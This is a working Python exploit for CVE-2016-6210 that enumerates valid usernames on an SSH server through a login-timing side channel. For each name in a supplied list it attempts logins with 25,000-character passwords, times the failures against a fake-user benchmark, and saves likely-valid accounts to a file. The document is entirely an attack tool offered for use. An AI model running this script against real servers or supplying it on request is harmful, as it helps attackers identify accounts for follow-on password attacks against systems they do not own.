#!/usr/bin/python3
import paramiko
import time, sys, csv, os
import threading
import logging

if len(sys.argv) < 4:
    print("REL: CVE-2016-6210")
    print("Usage: "+sys.argv[0]+" uname_list.txt host outfile")
    sys.exit()

p = 'A'*25000
THREAD_COUNT = 3
FAKE_USER = "AaAaAaAaAa"
BENCHMARK = 0

num_lines = sum(1 for line in open(sys.argv[1]))
username_list = sys.argv[1]
var = 0; time_per_user = 0
threads = []; usertimelist = {}

def ssh_connection(target, usertarget, outfile):
    global time_per_user
    starttime = 0; endtime = 0; total = 0
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    starttime = time.monotonic()
    try:
        ssh.connect(target, username=usertarget, password=p)
    except:
        endtime = time.monotonic()
    total = endtime - starttime
    with open(outfile, 'a+') as outputFile:
        csvFile = csv.writer(outputFile, delimiter=',')
        data = [[usertarget, total]]
        csvFile.writerows(data)
    time_per_user += total

if not os.stat(username_list).st_size == 0:
    print("- Connection logging set to paramiko.log, for the science, Morty, and debugging.")
    paramiko.util.log_to_file("paramiko.log")
    ssh_bench = paramiko.SSHClient()
    ssh_bench.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print("- Calculating a benchmark using FAKE_USER for... science.")
    tempbench = []
    for i in range(0,5):
        starttime = time.monotonic()
        try:
            ssh_bench.connect(sys.argv[2], username=FAKE_USER, password=p)
        except:
            endtime = time.monotonic()
        tempbench.append(endtime - starttime)
    BENCHMARK = sum(tempbench) / 5
    print("* Benchmark Successfully Calculated: " + str(BENCHMARK))
    with open(username_list) as users:
        for username in users:
            username = username.strip()
            for i in range(THREAD_COUNT):
                threader = threading.Thread(target=ssh_connection, args=(sys.argv[2], username, sys.argv[3]))
                threads.append(threader)
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
            threads = []
            print("[+] Averaged time for username "+username+" : "+str((time_per_user/THREAD_COUNT)))
            usertimelist.update({username : (time_per_user/THREAD_COUNT)})
            time_per_user = 0
else:
    print("[-] List is empty.. what did you expect? Give me some usernames, Morty!")

for user, time in sorted(usertimelist.items(), key=lambda item: item[1], reverse=True):
    benchmark_ratio = time / BENCHMARK
    fname = sys.argv[2].replace('.', '_') + "_valid_usernames.txt"
    if benchmark_ratio <= 0.10:
        print("[+] " + user + " invalid user; less than 10 percent of benchmark at: "+str(benchmark_ratio))
    elif benchmark_ratio < 0.20:
        print("[+] " + user + " toss up, not including based on current settings at: "+str(benchmark_ratio))
    elif 0.20 <= benchmark_ratio < 0.30:
        print("[+] " + user + " likely a valid user at: "+str(benchmark_ratio) + ". Appending to: " + fname)
        with open(fname, "a+") as outputFile:
            outputFile.write(user+"\n")
    elif benchmark_ratio >= 0.30:
        print("[+] " + user + " is a valid user, appending to: " + fname)
        with open(fname, "a+") as outputFile:
            outputFile.write(user+"\n")
